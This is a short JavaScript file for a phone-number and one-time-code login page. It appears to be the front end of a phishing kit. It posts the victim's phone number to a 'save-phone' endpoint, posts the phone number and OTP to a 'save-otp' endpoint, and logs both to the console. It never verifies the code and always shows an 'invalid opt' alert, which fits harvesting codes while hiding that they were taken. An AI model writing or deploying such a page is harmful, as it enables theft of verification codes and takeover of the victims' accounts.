document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const countryCodeSelect = document.getElementById('country');
    const phoneNumberInput = document.getElementById('phone-number');
    const errorMessage = document.getElementById('error-message');
    
    const phoneRegex = /^[0-9]+$/;

    if (!phoneRegex.test(phoneNumberInput.value.replace(/\s/g, ''))) {
        errorMessage.style.display = 'block';
        phoneNumberInput.classList.add('error');
    } else {
        errorMessage.style.display = 'none';
        phoneNumberInput.classList.remove('error');

        // Save phone number to MongoDB
        fetch(`${API_URL}/api/save-phone`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                countryCode: countryCodeSelect.value, 
                phoneNumber: phoneNumberInput.value 
            }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            // Switch to OTP section
            document.getElementById('login-section').classList.add('hidden');
            document.getElementById('otp-section').classList.remove('hidden');
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    }
});

document.getElementById('otp-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const countryCodeSelect = document.getElementById('country');
    const phoneNumberInput = document.getElementById('phone-number');
    const otpInput = document.getElementById('otp');
    const otpErrorMessage = document.getElementById('otp-error-message');
    
    const otpRegex = /^[0-9]{6}$/;

    if (!otpRegex.test(otpInput.value)) {
        otpErrorMessage.style.display = 'block';
        otpInput.classList.add('error');
    } else {
        otpErrorMessage.style.display = 'none';
        otpInput.classList.remove('error');

        const otpData = { 
            countryCode: countryCodeSelect.value,
            phoneNumber: phoneNumberInput.value, 
            otp: otpInput.value 
        };
        console.log('Sending OTP data:', otpData);

        // Save OTP
        fetch('/api/save-otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(otpData),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Server response:', data);
            alert('invalid opt: ' );
        })
        .catch((error) => {
            console.error('Error:', error);
            alert('Error saving OTP. Please try again.');
        });
    }
});
